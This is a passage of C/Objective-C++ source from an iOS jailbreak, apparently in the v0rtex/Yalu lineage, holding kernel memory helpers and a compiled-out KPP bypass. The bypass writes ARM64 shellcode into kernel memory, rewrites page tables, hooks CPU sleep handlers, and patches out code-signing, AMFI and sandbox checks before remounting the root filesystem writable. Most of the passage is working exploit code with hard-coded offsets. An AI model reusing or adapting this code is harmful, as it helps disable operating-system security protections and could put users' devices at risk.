    KERNEL_BASE_OR_GTFO(kbase);
    mach_hdr_t hdr_buf;
    if(kernel_read(kbase, sizeof(hdr_buf), &hdr_buf) != sizeof(hdr_buf))
    {
        fprintf(stderr, "[!] Kernel I/O error\n");
        return 0;
    }
    size_t hdr_size = sizeof(hdr_buf) + hdr_buf.sizeofcmds;

    mach_hdr_t *hdr = malloc(hdr_size);
    if(hdr == NULL)
    {
        fprintf(stderr, "[!] Failed to allocate header buffer: %s\n", strerror(errno));
        return 0;
    }
    if(kernel_read(kbase, hdr_size, hdr) != hdr_size)
    {
        fprintf(stderr, "[!] Kernel I/O error\n");
        return 0;
    }
    CMD_ITERATE(hdr, cmd)
    {
        switch(cmd->cmd)
        {
            case MACH_LC_SEGMENT:
            {
                mach_seg_t *seg = (mach_seg_t*)cmd;
                if (!strcmp(seg->segname, "__TEXT")) {
                    return seg->vmaddr;
                }
                break;
            }
            case LC_UNIXTHREAD:
            {
                uint32_t *ptr = (uint32_t *)(cmd + 1);
                uint32_t flavor = ptr[0];
                struct _tread{
                    uint64_t x[29];    /* General purpose registers x0-x28 */
                    uint64_t fp;    /* Frame pointer x29 */
                    uint64_t lr;    /* Link register x30 */
                    uint64_t sp;    /* Stack pointer x31 */
                    uint64_t pc;     /* Program counter */
                    uint32_t cpsr;    /* Current program status register */
                } *thread = (struct _tread*)(ptr + 2);
                if (flavor == 6) {
                    _kernel_entry = thread->pc;
                }
                break;
            }
        }
    }
    return 0;
}

const uint32_t gVirtBase_off = 0x53e038;
const uint32_t gPhysBase_off = 0x53e040;


#if 0
void kpp(void) {
    fprintf(stderr, "running KPP bypass");

    vm_address_t kbase;
    KERNEL_BASE_OR_GTFO(kbase);

    checkvad();

    uint64_t kbase_unslid = get_kernel_base_unslid();
    assert(kbase_unslid);

    uint64_t slide = kbase - kbase_unslid;

    uint64_t entryp;

    uint64_t gStoreBase = kbase + gVirtBase_off;

    gPhysBase = ReadAnywhere64(gStoreBase+8);
    gVirtBase = ReadAnywhere64(gStoreBase);

    entryp = _kernel_entry + slide;
    uint64_t rvbar = entryp & (~0xFFF);

    uint64_t cpul = fi->find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x40-slide, 1)+slide;

    uint64_t optr = fi->find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x50-slide, 20)+slide;

    fprintf(stderr, "%llx", optr);

    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
    uint64_t cpu = ReadAnywhere64(cpu_list);

    uint64_t pmap_store = (uint64_t)fi->find_kernel_pmap() + slide;
    fprintf(stderr, "pmap: %llx", pmap_store);
    level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));




    uint64_t shellcode = physalloc(0x4000);

    /*
     ldr x30, a
     ldr x0, b
     br x0
     nop
     a:
     .quad 0
     b:
     .quad 0
     none of that squad shit tho, straight gang shit. free rondonumbanine
     */

    WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);

    WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);

    char buf[0x100];
    copyin(buf, optr, 0x100);
    copyout(shellcode+0x300, buf, 0x100);

    uint64_t physcode = findphys_real(shellcode);

    fprintf(stderr, "got phys at %llx for virt %llx", physcode, shellcode);

    uint64_t idlesleep_handler = 0;

    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
    int z = 0;

    int idx = 0;
    int ridx = 0;
    while (cpu) {
        cpu = cpu - gPhysBase + gVirtBase;
        if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
            fprintf(stderr, "already jailbroken, bailing out");
            return;
        }


        if (!idlesleep_handler) {
            WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
            WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler

            idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;


            uint32_t* opcz = (uint32_t*)malloc(0x1000);
            copyin(opcz, idlesleep_handler, 0x1000);
            idx = 0;
            while (1) {
                if (opcz[idx] == 0xd61f0000 /* br x0 */) {
                    break;
                }
                idx++;
            }
            ridx = idx;
            while (1) {
                if (opcz[ridx] == 0xd65f03c0 /* ret */) {
                    break;
                }
                ridx++;
            }


        }

        fprintf(stderr, "found cpu %x", ReadAnywhere32(cpu+0x330));
        fprintf(stderr, "found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);

        plist[z++] = cpu+0x130;
        cpu_list += 0x10;
        cpu = ReadAnywhere64(cpu_list);
    }


    uint64_t shc = physalloc(0x4000);

    uint64_t regi = fi->find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+12-slide, 30)+slide;
    uint64_t regd = fi->find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+24-slide, 30)+slide;

    fprintf(stderr, "%llx - %llx", regi, regd);

    for (int i = 0; i < 0x500/4; i++) {
        WriteAnywhere32(shc+i*4, 0xd503201f);
    }

    /*
     isvad 0 == 0x4000
     */

    uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);

    uint64_t ttbr0_real = fi->find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler-slide + idx*4 + 24), 1)+slide;

    fprintf(stderr, "ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);

    char* bbuf = (char*)malloc(0x4000);
    copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
    copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);

    uint64_t physp = findphys_real(level0_pte);


    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regi);
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);

    shc+=0x100;
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regd); /*handle deepsleep*/
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    shc-=0x100;
    {
        int n = 0;
        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr    w8, 0x28
        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str        w8, [x23]
        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov     x0, xzr
        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub    sp, x29, #64
        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp    x29, x30, [sp, #64]
        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp    x20, x19, [sp, #48]
        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp    x22, x21, [sp, #32]
        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp    x24, x23, [sp, #16]
        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80
        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0

    }

    mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);

    mach_vm_address_t kppsh = 0;
    mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
    {
        int n = 0;

        WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr    x1, #60
        WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr    x0, #40
        WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr    TTBR1_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd2a00600); n+=4; // movz    x0, #0x30, lsl #16
        WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr    CPACR_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr    TTBR1_EL1, x1
        WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr    x0, #-4
        WriteAnywhere32(kppsh+n, isvad ? 0xd5033b9f : 0xd503201f); n+=4; // dsb ish (4k) / nop (16k)
        WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi vmalle1 (4k) / tlbi    vae1, x30 (16k)
        WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
        WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere64(kppsh+n, ReadAnywhere64(ttbr0_real)); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
    }

    mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);

    WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
    WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle

    WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
    WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler

    /*

     pagetables are now not real anymore, they're real af

     */

    uint64_t cpacr_addr = (uint64_t)fi->find_cpacr_write() + slide;
#define PSZ (isvad ? 0x1000 : 0x4000)
#define PMK (PSZ-1)


#define RemapPage_(address) \
pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
uint64_t tte = ReadAnywhere64(tte_addr);\
if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
fprintf(stderr, "breakup!");\
uint64_t fakep = physalloc(PSZ);\
uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
TTE_SETB(tte, TTE_IS_TABLE_MASK);\
for (int i = 0; i < PSZ/8; i++) {\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
WriteAnywhere64(fakep+i*8, tte);\
}\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
WriteAnywhere64(tte_addr, tte);\
}\
uint64_t newt = physalloc(PSZ);\
copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
copyout(newt, bbuf, PSZ);\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
WriteAnywhere64(tte_addr, tte);\
}, level1_table, isvad ? 1 : 2);

#define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)

    uint64_t* remappage = (uint64_t*)calloc(512, 8);

    int remapcnt = 0;


#define RemapPage(x)\
{\
int fail = 0;\
for (int i = 0; i < remapcnt; i++) {\
if (remappage[i] == (x & (~PMK))) {\
fail = 1;\
}\
}\
if (fail == 0) {\
RemapPage_(x);\
RemapPage_(x+PSZ);\
remappage[remapcnt++] = (x & (~PMK));\
}\
}

    level1_table = physp - gPhysBase + gVirtBase;
    WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);


    uint64_t shtramp = kernbase + ((const struct mach_header *)fi->kdata())->sizeofcmds + sizeof(struct mach_header_64);
    RemapPage(cpacr_addr);
    WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));

    RemapPage(shtramp);
    WriteAnywhere32(NewPointer(shtramp), 0x58000041);
    WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
    WriteAnywhere64(NewPointer(shtramp)+8, kppsh);


    WriteAnywhere64((uint64_t)fi->find_idlesleep_str_loc()+slide, physcode+0x100);
    WriteAnywhere64((uint64_t)fi->find_deepsleep_str_loc()+slide, physcode+0x200);


    //kernelpatches
    fprintf(stderr, "patching kernel");

    return;

    std::vector<tihmstar::patchfinder64::patch> kernelpatches;
    kernelpatches.push_back(fi->find_i_can_has_debugger_patch_off());

    std::vector<tihmstar::patchfinder64::patch> nosuid = fi->find_nosuid_off();

    kernelpatches.push_back(fi->find_remount_patch_offset());
    kernelpatches.push_back(fi->find_lwvm_patch_offsets());
    kernelpatches.push_back(nosuid.at(0));
    kernelpatches.push_back(nosuid.at(1));
    kernelpatches.push_back(fi->find_proc_enforce());
    kernelpatches.push_back(fi->find_amfi_patch_offsets());
    kernelpatches.push_back(fi->find_cs_enforcement_disable_amfi());
    kernelpatches.push_back(fi->find_amfi_substrate_patch());
    kernelpatches.push_back(fi->find_nonceEnabler_patch());

    try {
        kernelpatches.push_back(fi->find_sandbox_patch());
    } catch (tihmstar::exception &e) {
        fprintf(stderr, "WARNING: failed to find sandbox_patch! Assuming we're on x<10.3 and continueing anyways!");
    }


    auto dopatch = [&](tihmstar::patchfinder64::patch &patch){
        patch.slide(slide);
        NSString * str = @"patching at: %p [";
        for (int i=0; i<patch._patchSize; i++) {
            str = [NSString stringWithFormat:@"%@%02x",str,*((uint8_t*)patch._patch+i)];
        }
        NSLog([str stringByAppendingString:@"]"],patch._location);
        RemapPage((uint64_t)(patch._location+slide));
        for (size_t i=0; i<patch._patchSize;i+=4) {
            int diff = (int)(patch._patchSize-i);
            if (diff >=8){
                WriteAnywhere64(NewPointer((uint64_t)patch._location+slide+i), *(uint64_t*)((uint8_t*)patch._patch+i));
            }else{
                uint64_t p = ReadAnywhere64((uint64_t)patch._location+slide+i);
                p &= ~(((uint64_t)1<<(8*diff))-1);
                p |= ((*(uint64_t*)((uint8_t*)patch._patch+i)) % ((uint64_t)1<<(8*diff)));
                WriteAnywhere64(NewPointer((uint64_t)patch._location+slide+i), p);
            }
        }
    };


    for (auto patch : kernelpatches){
        dopatch(patch);
    }

    fprintf(stderr, "patching sandbox");
    uint64_t sbops = (uint64_t)fi->find_sbops()+slide;
    uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;

    uint64_t nopag = (sbops_end - sbops)/(PSZ);

    for (int i = 0; i < nopag; i++) {
        RemapPage(((sbops + i*(PSZ)) & (~PMK)));
    }

    printf("Found sbops 0x%llx\n",sbops);

    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);

    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
    WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);

    uint64_t marijuanoff = (uint64_t)fi->memmem("RELEASE_ARM",sizeof("RELEASE_ARM")-1)+slide;

    // smoke trees
    RemapPage(marijuanoff);
    WriteAnywhere64(NewPointer(marijuanoff), *(uint64_t*)"Marijuan");

    for (int i = 0; i < z; i++) {
        WriteAnywhere64(plist[i], physcode + 0x100);
    }

    //check for i_can_has_debugger
    while (ReadAnywhere32((uint64_t)kernelpatches.at(0)._location+slide) != 1) {
        sleep(1);
    }

    char* nm = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", 0x10000, &nm);
    printf("Mount succeeded? %d\n",mntr);

    if (open("/v0rtex", O_CREAT | O_RDWR, 0644)>=0){
        printf("write test success!\n");
        remove("/v0rtex");
    }else
        printf("[!] write test failed!\n");


    fprintf(stderr, "enabled patches");
}
#endif

kern_return_t kernel_set_prot(vm_address_t addr, vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection)
{
    DEBUG("Changing %s perms to kernel at " ADDR "-" ADDR " to 0x%08x", set_maximum ? "max" : "current", addr, addr + size, new_protection);
    kern_return_t ret;
    task_t kernel_task;

    ret = get_kernel_task(&kernel_task);
    if(ret != KERN_SUCCESS)
    {
        return -1;
    }

    ret = vm_protect(kernel_task, addr, size, set_maximum, new_protection);
    if(ret != KERN_SUCCESS)
    {
        DEBUG("vm_write error: %s", mach_error_string(ret));
    }

    return ret;
}

vm_address_t kernel_find(vm_address_t addr, vm_size_t len, void *buf, size_t size)
{
    vm_address_t ret = 0;
    unsigned char* b = malloc(len);
    if(b)
    {
        // TODO reading in chunks would probably be better
        if(kernel_read(addr, len, b))
        {
            void *ptr = memmem(b, len, buf, size);
            if(ptr)
            {
                ret = addr + ((char*)ptr - (char*)b);
            }
        }
        free(b);
    }
    return ret;
}
